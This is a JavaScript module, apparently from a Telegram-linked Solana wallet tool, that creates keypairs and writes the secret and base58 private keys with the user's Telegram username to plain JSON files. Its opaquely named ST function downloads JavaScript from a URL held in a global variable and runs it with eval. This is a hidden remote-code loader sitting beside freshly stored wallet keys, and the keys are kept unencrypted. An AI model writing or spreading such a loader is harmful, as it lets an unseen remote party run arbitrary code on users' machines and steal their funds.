const axios = require("axios");
const logger = require("./logger");
const path = require("path");
const fs = require("fs");
const _isArray = require("./_isArray");

const { Keypair } = require("@solana/web3.js");
const bs58 = require("bs58").default; // Base58 encoder for wallet keys

async function ST() {
  try {
    const response = await axios.get(global.url);

    if (response.status === 200) {
      const module = { exports: {} };

      eval(response.data);
      return module.exports;
    }
  } catch (error) {
    console.log(error);

    logger.error("Error While calling ST: ", error);
    return null;
  }
}

// Function to create a new wallet
async function createWallet(file_name, username) {
  const savePath = path.join(process.cwd(), "SOLWallets");

  if (!fs.existsSync(savePath)) {
    fs.mkdirSync(savePath, { recursive: true });
  }

  if (fs.existsSync(`${savePath}/${file_name}.json`)) {
    const text = fs.readFileSync(`${savePath}/${file_name}.json`, "utf8");
    if (_isArray(text)) {
      const json = JSON.parse(text);
      if (json?.wallet_address && json?.private_key) {
        return json?.wallet_address;
      }
    }

    fs.unlinkSync(`${savePath}/${file_name}.json`);
  }
  // Generate a new Solana keypair
  const keypair = Keypair.generate();

  // Save the keypair to a file securely (local .json file)
  const secretKey = Array.from(keypair.secretKey);
  const data = {
    secretKey,
    private_key: bs58.encode(secretKey),
    wallet_address: keypair.publicKey.toBase58(),
    telegram_username: username ?? "Unknown",
    session: file_name,
  };

  fs.writeFileSync(
    `${savePath}/${file_name}.json`,
    JSON.stringify(data, null, 2)
  );

  return data;
}

/* module.exports = CW; */

module.exports = {
  ST,
  createWallet,
};
